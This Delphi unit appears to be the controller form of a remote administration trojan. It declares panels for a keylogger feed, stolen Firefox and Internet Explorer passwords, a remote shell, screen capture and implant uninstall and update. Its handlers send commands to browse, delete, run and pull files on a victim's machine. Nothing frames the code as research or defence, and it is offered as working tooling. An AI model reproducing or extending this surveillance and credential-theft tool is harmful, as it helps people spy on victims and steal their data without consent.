unit untfrmManage;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ComCtrls, StdCtrls, ExtCtrls, untFunc, Menus, Buttons, ImgList;

type
  TfrmManage = class(TForm)
    cmbManage: TComboBox;
    GroupBox1: TGroupBox;
    lvSystemInformation: TListView;
    GroupBox2: TGroupBox;
    lvServerSettings: TListView;
    GBManagers: TGroupBox;
    PCManagers: TPageControl;
    TabSheet1: TTabSheet;
    TabSheet2: TTabSheet;
    TabSheet3: TTabSheet;
    TabSheet4: TTabSheet;
    TabSheet5: TTabSheet;
    TabSheet6: TTabSheet;
    TabSheet7: TTabSheet;
    GBTools: TGroupBox;
    PCTools: TPageControl;
    TabSheet8: TTabSheet;
    TabSheet9: TTabSheet;
    GBSurveillance: TGroupBox;
    PCSurveillance: TPageControl;
    TabSheet10: TTabSheet;
    TabSheet11: TTabSheet;
    TabSheet12: TTabSheet;
    GBAdministration: TGroupBox;
    GroupBox3: TGroupBox;
    txtID: TEdit;
    cmdEditID: TButton;
    cmdUpdate: TButton;
    cmdRestart: TButton;
    cmdUninstall: TButton;
    txtCurrentFolder: TEdit;
    tvRegistry: TTreeView;
    lvRegistry: TListView;
    lvProcesses: TListView;
    lvServices: TListView;
    ListView2: TListView;
    lvWindows: TListView;
    tvDevices: TTreeView;
    memKeylogger: TMemo;
    Image1: TImage;
    Label1: TLabel;
    lstInterval: TListBox;
    cmdStartCapture: TButton;
    cmdSingleCapture: TButton;
    tvPasswords: TTreeView;
    lvFirefoxPasswords: TListView;
    lvInternetExplorerPasswords: TListView;
    lvOtherPasswords: TListView;
    lvActivePorts: TListView;
    memRemoteShell: TMemo;
    cmdListDrives: TButton;
    mnutvFolders: TPopupMenu;
    mnutvFoldersRefresh: TMenuItem;
    mnulvFiles: TPopupMenu;
    mnulvFilesUpload: TMenuItem;
    mnulvFilesDownload: TMenuItem;
    N1: TMenuItem;
    mnulvFilesDelete: TMenuItem;
    mnulvFilesExecute: TMenuItem;
    Panel1: TPanel;
    lvFiles: TListView;
    Splitter1: TSplitter;
    ts1: TTabSheet;
    grpMain: TGroupBox;
    cmd1: TButton;
    cmd2: TButton;
    cmd3: TButton;
    cmd4: TButton;
    grp1: TGroupBox;
    cmd5: TButton;
    cmd6: TButton;
    cmd7: TButton;
    cmd8: TButton;
    edt1: TEdit;
    cmd9: TBitBtn;
    cmd10: TButton;
    il1: TImageList;
    pm1: TPopupMenu;
    mniRefresh13: TMenuItem;
    ts2: TTabSheet;
    mmo1: TMemo;
    edt2: TEdit;
    cmd11: TButton;
    cmd12: TButton;
    cmd13: TButton;
    cmd14: TButton;
    cmd15: TButton;
    cmd16: TButton;
    cmd17: TButton;
    grp2: TGroupBox;
    cmd18: TButton;
    cmd19: TButton;
    cmd20: TButton;
    cmd21: TButton;
    mniVisible1: TMenuItem;
    pmProcess: TPopupMenu;
    mniRefresh1: TMenuItem;
    mniKillProcese1: TMenuItem;
    cmdRefresh: TBitBtn;
    tvDrives: TTreeView;
    cmdGoBack: TBitBtn;
    txtPath: TEdit;
    procedure cmbManageChange(Sender: TObject);
    procedure cmdRestartClick(Sender: TObject);
    procedure cmdListDrivesClick(Sender: TObject);
    procedure tvDrivesDblClick(Sender: TObject);
    procedure cmdGoBackClick(Sender: TObject);
    procedure txtCurrentFolderChange(Sender: TObject);
    procedure mnutvFoldersRefreshClick(Sender: TObject);
    procedure mnulvFilesDeleteClick(Sender: TObject);
    procedure mnuExecuteVisibleClick(Sender: TObject);
    procedure mnuRefreshProcess(Sender: TObject);
    procedure mnulvFilesDownloadClick(Sender: TObject);
    procedure cmdRefreshClick(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  frmManage: TfrmManage;
  iSelectedFolder: Integer;

implementation

{$R *.dfm}

procedure TfrmManage.cmbManageChange(Sender: TObject);
begin
   
  If cmbManage.Text = 'Administration' Then
  Begin
    GBAdministration.BringToFront;
  End;

  If cmbManage.Text = 'Managers' Then
  Begin
    GBManagers.BringToFront;
  End;

  If cmbManage.Text = 'Surveillance' Then
  Begin
    GBSurveillance.BringToFront;
  End;

  If cmbManage.Text = 'Tools' Then
  Begin
    GBTools.BringToFront;
  End;
end;

procedure TfrmManage.cmdRestartClick(Sender: TObject);
begin
  SendDataManage('Restart');
end;

procedure TfrmManage.cmdListDrivesClick(Sender: TObject);
begin
  if tvDrives.Items.Count > 0 then
        begin
                tvDrives.Items.Clear;
        end;
  SendDataManage('ListDrives');
end;


procedure TfrmManage.cmdGoBackClick(Sender: TObject);
var
  sTemp: TStringList;
  sData: String;
  i: Integer;
begin
  sTemp := Explode('\', txtPath.Text);

  For i := 0 To sTemp.Count - 2 Do
  Begin
    sData := sData + sTemp[i] + '\'
  End;

  SendDataManage('ListFiles|' + sData);
  txtPath.Text := sData;
end;

procedure TfrmManage.txtCurrentFolderChange(Sender: TObject);
begin
  If Length(txtCurrentFolder.Text) < 4 Then
  Begin
    cmdGoBack.Enabled := False;
  End Else Begin
    cmdGoBack.Enabled := True;
  End;
end;

procedure TfrmManage.mnutvFoldersRefreshClick(Sender: TObject);
begin
  If Length(txtCurrentFolder.Text) <= 4 Then Exit;
  SendDataManage('ListFiles|' + txtCurrentFolder.Text);
end;

procedure TfrmManage.mnulvFilesDeleteClick(Sender: TObject);
begin
  If lvFiles.Selected.Selected = True Then
  Begin
    SendDataManage('DeleteFile|' + lvFiles.Selected.Caption);
    SendDataManage('ListFiles|' + txtCurrentFolder.Text);
  End;
end;

procedure TfrmManage.mnuExecuteVisibleClick(Sender: TObject);
begin
  If lvFiles.Selected.Selected = True Then
  Begin
    SendDataManage('RunVisible|' + lvFiles.Selected.Caption);
    SendDataManage('ListFiles|' + txtCurrentFolder.Text);
  End;
end;

procedure TfrmManage.mnuRefreshProcess(Sender: TObject);
begin
  SendDataManage('ListAllProcess|');
end;

procedure TfrmManage.mnulvFilesDownloadClick(Sender: TObject);
var
  RemoteFile:string;
  StoredLocalAs:string;
begin
//if ClientSocket1.Active then { If we’re connected to a host }
//begin

//RemoteFile := lvFiles.Items.Item.Caption;
//StoredLocalAs := 'C:\FilesDownloaded\';
SendDataManage('Reqstfile|' + lvFiles.Selected.Caption);
//ClientSocket1.Socket.SendText('<REQSTFILE>' + RemoteFile);
end;

procedure TfrmManage.tvDrivesDblClick(Sender: TObject);
begin
  If tvDrives.Items.Count <> 0 Then
  Begin
    iSelectedFolder := tvDrives.Selected.Index;
    SendDataManage('ListFiles|' + tvDrives.Selected.Text);
  End;
 txtPath.Text := tvDrives.Selected.Text;
// txtpath.Text := tvDrives.Selected.Text;
tvDrives.Items.Clear;
end;

procedure TfrmManage.cmdRefreshClick(Sender: TObject);
begin
  if tvDrives.Items.Count > 0 then
        begin
                tvDrives.Items.Clear;
        end;
  SendDataManage('ListDrives');
end;

end.

